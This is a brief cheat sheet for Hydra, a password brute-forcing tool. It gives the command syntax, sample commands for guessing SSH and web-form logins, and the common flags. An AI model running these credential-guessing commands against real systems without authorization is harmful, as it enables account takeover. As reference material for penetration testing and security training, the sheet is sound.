Hydra- a brute force credential tool

hydra -l username -P passwords.txt <target> <protocol>

Example of a ssh login:
  hydra -l admin -P passwords.txt 0.0.0.0.0 ssh

example of a http login:
  hydra -l admin -P passwords.txt 0.0.0.0.0 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"
      
      /login.php -> login page
      user=^USER^&pass=^PASS^ -> form fields
      F=incorrect -> failure

-l -> single username
-L -> username list
-p -> single password
-P -> password list
-t -> number of threads (speed)
-V -> verbose (shows each attempt)
-f -> stop after first valid login
-s -> specify port
